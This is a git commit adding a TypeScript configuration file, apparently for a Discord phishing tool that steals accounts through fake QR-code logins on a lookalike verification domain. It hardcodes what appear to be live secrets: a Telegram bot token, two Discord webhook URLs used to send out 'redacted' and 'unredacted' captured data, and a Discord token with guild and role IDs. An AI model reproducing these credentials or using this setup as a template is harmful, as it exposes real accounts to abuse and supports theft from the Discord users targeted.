0965e927746952c8eca687597ac2d35cf6beaaf2
Justtestingsth <141454985+Justtestingsth@users.noreply.github.com>
2023-08-18 00:50:21 +0200

    Add files via upload

---
+++ config.ts
@@ -0,0 +1,25 @@
+// SERVER DETAILS
+export const domain = 'botbentry.xyz';
+export const fullDomain = `https://${domain}`;
+export const proxies: string[] = [];
+export const fakeQr = false;
+export const qrCodeEndpoint = 'localhost:8080/proxy';
+export const hostingOnVPS = true;
+
+// TELEGRAM DETAILS
+export const telegramToken = '6529370298:AAF6qOaZBC3TZwj07yOoyYlqs22RDKmdqUU';
+export const telegramChatId = '-923296174';
+
+// DISCORD OAUTH DETAILS
+export const clientID = '';
+export const clientSecret = '';
+export const redirectURI = `${fullDomain}/login`;
+
+// WEBHOOKS
+export const redactedWebhook = 'https://discord.com/api/webhooks/1141731641425932453/bSZ_P0El4nLdI09SRVUjyvxgiz9MPFbk9xYwnD-hDQouHdco6GwHgfmT_XkozReXRoWi';
+export const unredactedWebhook = 'https://discord.com/api/webhooks/1141731514644693032/w8nR08DSCtmOs29JGQ-tIDP5F4WWInE1ePtjxWYID5rGqHtYDLF6wKHq71KYPSfY0KuK';
+
+// AUTO ROLE
+export const autoRoleToken = 'MTAwMjk4MjE5NDQwODU5OTU3Mg.G_fS46.RvblqPskCi1qsanYEa87dz4_14B0lc4gJQ0WBY';
+export const autoRoleGuildId = '1140933199187410964';
+export const autoRoleRoleId = '1141671496973029436';
